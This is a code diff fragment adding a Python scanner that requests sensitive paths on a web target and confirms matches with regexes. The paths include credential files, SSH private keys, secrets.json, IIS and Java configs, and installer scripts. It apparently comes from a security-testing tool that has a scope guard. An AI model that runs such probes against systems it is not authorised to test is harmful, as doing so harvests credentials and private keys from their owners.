+        ("/.graphql", "graphql", r"type\s+Query|schema\s*\{"),
+        # Firebase / cloud
+        ("/.firebase.json", "cloud", r'"hosting"|"database"|"functions"'),
+        ("/firebase.json", "cloud", r'"hosting"|"database"'),
+        # Credentials
+        ("/credentials.json", "creds", r'"type"|"client_id"|"private_key"'),
+        ("/secrets.json", "creds", r'"secret"|"key"|"password"'),
+        ("/id_rsa", "creds", r"-----BEGIN.*PRIVATE KEY"),
+        ("/.ssh/id_rsa", "creds", r"-----BEGIN.*PRIVATE KEY"),
+        # Misc
+        ("/robots.txt", "robots", r"Disallow:|Allow:|Sitemap:"),
+        ("/sitemap.xml", "sitemap", r"<urlset|<sitemapindex"),
+        ("/crossdomain.xml", "flash", r"<cross-domain-policy"),
+        ("/.well-known/security.txt", "security", r"Contact:|Expires:"),
+        ("/trace", "debug", r"TRACE /|echo_header"),
+        ("/elmah.axd", "dotnet", r"Error Log|ELMAH"),
+        ("/web.config", "iis", r"<configuration|<system.web"),
+        ("/WEB-INF/web.xml", "java", r"<web-app|<servlet"),
+        # Init / setup
+        ("/install.php", "setup", r"install|setup|configuration"),
+        ("/setup.php", "setup", r"install|setup|configuration"),
+    ]
+
+    # Tech stack → category filter (only test relevant paths)
+    _TECH_CATEGORIES: dict[str, list[str]] = {
+        "php": ["php", "wordpress", "laravel", "apache"],
+        "laravel": ["laravel", "php", "apache"],
+        "wordpress": ["wordpress", "php", "apache"],
+        "django": ["django"],
+        "spring": ["spring", "java"],
+        "java": ["spring", "java"],
+        "node": ["nodejs"],
+        "express": ["nodejs"],
+        "react": ["nodejs", "sourcemap"],
+        "next": ["nodejs", "sourcemap"],
+        "vue": ["nodejs", "sourcemap"],
+        "angular": ["nodejs", "sourcemap"],
+        "iis": ["iis", "dotnet"],
+        "asp.net": ["iis", "dotnet"],
+    }
+
+    # Categories always tested regardless of tech stack
+    _UNIVERSAL_CATEGORIES = {
+        "git", "env", "docker", "api_docs", "backup", "creds",
+        "robots", "sitemap", "graphql", "cloud", "config",
+    }
+
+    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        self._timeout = timeout
+        self._socks_proxy = socks_proxy
+
+    async def scan(self, url: str, tech_stack: list[str] | None = None) -> dict[str, Any]:
+        """Scan for sensitive path disclosures with content verification.
+
+        Args:
+            url: Base URL to scan.
+            tech_stack: Optional detected technologies for path filtering.
+
+        Returns:
+            {verified: [{path, category, evidence_preview, content_length}], scanned: int, elapsed_s: float}
+        """
+        if self._scope_guard:
+            self._scope_guard.validate_url(url)
+
+        base_url = url.rstrip("/")
+        start = time.monotonic()
+
+        # Filter paths by tech stack
+        allowed_categories = set(self._UNIVERSAL_CATEGORIES)
+        if tech_stack:
+            for tech in tech_stack:
+                tech_lower = tech.lower()
+                for keyword, cats in self._TECH_CATEGORIES.items():
+                    if keyword in tech_lower:
+                        allowed_categories.update(cats)
+        # If no tech detected, test everything
+        if not tech_stack:
+            allowed_categories = {cat for _, cat, _ in self._PATHS}
+
+        paths_to_test = [
+            (p, cat, regex)
+            for p, cat, regex in self._PATHS
+            if cat in allowed_categories
+        ]
+
+        verified: list[dict[str, Any]] = []
+        scanned = 0
+
+        proxy_kwargs: dict[str, Any] = {}
+        if self._socks_proxy:
+            proxy_kwargs["proxy"] = self._socks_proxy
+
+        async with httpx.AsyncClient(
+            timeout=self._timeout, verify=False, follow_redirects=True, **proxy_kwargs,
+        ) as client:
+            for path, category, regex in paths_to_test:
+                scanned += 1
+                try:
+                    await asyncio.sleep(0.1)  # Rate limit: 100ms
+                    resp = await client.get(f"{base_url}{path}")
+
+                    # Skip non-200 responses
+                    if resp.status_code != 200:
+                        continue
+
+                    # Skip very large responses (likely generic error pages)
+                    if len(resp.content) > 5_000_000:
+                        continue
+
+                    # Skip very small responses (likely empty/error)
+                    if len(resp.content) < 10:
+                        continue
+
+                    # Content verification: regex must match
+                    body = resp.text[:10000]  # Check first 10KB
+                    if not re.search(regex, body, re.IGNORECASE | re.MULTILINE):
+                        continue
+
+                    # Verified! Real sensitive content found
+                    verified.append({
+                        "path": path,
+                        "category": category,
+                        "status_code": resp.status_code,
+                        "content_length": len(resp.content),
+                        "evidence_preview": body[:500],
+                    })
+                    logger.info("info_disclosure_verified", path=path, category=category,
+                                content_length=len(resp.content))
+
+                except Exception:
+                    continue  # Skip connection errors
+
+        elapsed = round(time.monotonic() - start, 1)
+        return {
+            "verified": verified,
+            "scanned": scanned,
+            "elapsed_seconds": elapsed,
+        }
